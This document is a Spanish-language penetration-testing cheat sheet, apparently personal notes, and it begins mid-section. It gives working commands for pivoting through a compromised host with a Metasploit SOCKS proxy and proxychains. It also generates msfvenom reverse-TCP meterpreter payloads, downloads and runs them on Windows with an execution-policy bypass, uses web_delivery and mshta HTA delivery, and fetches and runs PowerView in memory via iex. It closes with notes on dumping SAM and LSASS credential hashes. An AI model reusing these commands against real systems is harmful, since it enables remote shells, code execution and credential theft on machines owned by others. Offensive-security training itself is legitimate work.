use auxiliary/server/socks_proxy /set SRVPORT MY_PORT
set VERSION 4a
run
```

Con esto, puedo ir al fichero /etc/proxychains4.conf y a√±adir un **socks4 127.0.0.1 PORT**.
Con esto, ya puedo ejecutar comandos precedidos de proxychains para usar la m√°quina comprometida como intermediaria.

## **üíâ Pasar una m√°quina a Metasploit para sesi√≥n de meterpreter**

### **üì¶ Windows (Archivo .exe)**

```bash
# Linux

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe // Creaci√≥n del payload
----------------------------------------------------------------------------
# Linux

python3 -m http.server 80
----------------------------------------------------------------------------
# Windows

iwr -UseBasicParsing -Uri 'http://10.10.10.10/shell.exe' -o 'FILENAME.exe'
----------------------------------------------------------------------------
# Metasploit

use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
run -j
----------------------------------------------------------------------------
# Windows

powershell -ep bypass -c .\shell.exe
runas.exe /user:administrator .\shell.exe
```

### **üìú Windows (Archivo .ps1)**

```bash
# 1. Metasploit

use exploit/multi/script/web_delivery 
set payload windows/x64/meterpreter/reverse_tcp
set target 2
exploit
# Intentamos podificar para poner -ep bypass en el script
----------------------------------------------------------------------------
# 2. Metasploit


use exploit/windows/misc/hta_server
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set TARGET 1
exploit -j
----------------------------------------------------------------------------
# Windows

mshta.exe http://URL_METASPLOIT
```

## **üì• Descargar archivos en Windows**

```bash
# 1. iex (Invoke-Expression) va a ejecutar la cadena de texto que est√© como par√°metro.
# 2. El resto del comando es el encargado de descarga el archivo
# 3. Por esto una vez corrido esto, no es necesario cargar PowerView.ps1

iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/PowerView.ps1')

# 1. Simplemente descarga un archivo y lo guarda

iwr http://10.0.5.101/Rubeus.exe -OutFile Rubeus.exe
```

## **Hash Dump**

Para realizar un dumpeo de Hashes, podemos hacer uso tanto de la SAM (Security Account Manager) como del LSASS (Local Security Authority Subsystem Service).

La SAM es la base de datos de cuentas locales del equipo, se almacenan en `C:\Windows\System32\config\SAM` y como hive de registro `HKLM\SAM` y est√° cifrada con una clave derivada del hive `HKLM\SYSTEM`. Para poder dumpearla, hace falta ser `SYSTEM / Admin Local` o tener los privilegios de `SeBackupPrivilege`.

El LSA o LSASS.exe es algo parecido a la SAM solo que esto es un proceso que est√° en memoria. No obstante, aqui se guardan tanto credenciales de cuentas locales, como credenciales de cuentas del dominio. Para poder dumpearla, hace falta ser `SYSTEM / Admin Local` o tener los privilegios de `SeBackupPrivilege`.